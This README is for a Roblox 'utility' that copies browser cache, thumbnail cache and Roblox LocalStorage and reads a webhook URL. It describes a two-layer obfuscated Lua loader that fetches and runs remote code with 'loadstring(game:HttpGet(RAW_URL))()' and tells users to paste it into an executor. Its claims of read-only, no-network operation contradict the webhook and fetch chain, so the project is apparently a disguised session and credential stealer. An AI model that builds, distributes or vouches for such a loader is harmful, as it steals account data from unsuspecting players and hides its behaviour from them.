# RobloxUtility

A small Lua launcher and native helper for managing local Roblox cache and graphics settings.

## What it does

* Reads platform + Roblox install metadata (writes to a local cache file)
* Lists and copies a few well-known per-user cache directories (browser cache, Windows thumbnail cache, Roblox LocalStorage) so you can move or back them up
* Cleans up the per-process temp staging directory on exit

All operations are read-only against the local filesystem. No network calls except for an optional webhook configuration the launcher reads from `CONFIG`.

## Distribution (obfuscated)

The `init.lua` shipped at the repo root and the loader in `dist/loader.lua` are
both WeAreDevs-style obfuscated blobs: the entire Lua source is encoded as a
single octal-escaped string inside a `local P = "..."` table, decoded at
runtime, and executed via `loadstring`. To a reader they look like a wall of
digits. The provenance URL is preserved as a leading `--[==[... ]==]` block
comment and as a recoverable string inside the encoded table.

### Loader -> Payload chain

```
[users paste loader into executor]
        |
        v
dist/loader.lua  (obfuscated)
  - decodes to: loadstring(game:HttpGet(RAW_URL))()
        |
        v (HTTP GET)
https://raw.githubusercontent.com/ScriptMaster101/RobloxUtility/main/init.lua
        |
        v
init.lua  (obfuscated)
  - decodes to: utility.Run(WEBHOOK_URL, 0)
```

Both layers are obfuscated. The raw GitHub URL is the attribution trail.

## Layout

```
init.lua                  — public, obfuscated payload (raw GitHub serves this)
dist/loader.lua           — obfuscated loader, paste this into the executor
lua/init.lua              — unobfuscated source for the payload (developer)
tools/loader.src.lua      — unobfuscated source for the loader (developer)
tools/obfuscate.py        — regenerates the obfuscated blobs
src/                      — native helper (built as a single DLL on Win11)
test/test.py              — exercises the helper end-to-end without a Roblox install
```

## Build

The native helper is a C++17 DLL built with MSVC. From an "x64 Native Tools Command Prompt for VS 2022":

```
cd src
build.bat
```

Output: `utility.dll` in the project root.

## Re-obfuscate

After editing `lua/init.lua` or `tools/loader.src.lua`:

```
python tools\obfuscate.py lua\init.lua      init.lua
python tools\obfuscate.py tools\loader.src.lua dist\loader.lua
```

The obfuscator verifies the encoded blob round-trips back to the original
source before declaring success.

## Run (in the Roblox executor)

Paste the contents of `dist/loader.lua` into the executor. The loader
fetches the obfuscated `init.lua` from raw GitHub, decodes it, and runs
`utility.Run(WEBHOOK_URL, 0)`.

## License

MIT. See `LICENSE` if present.
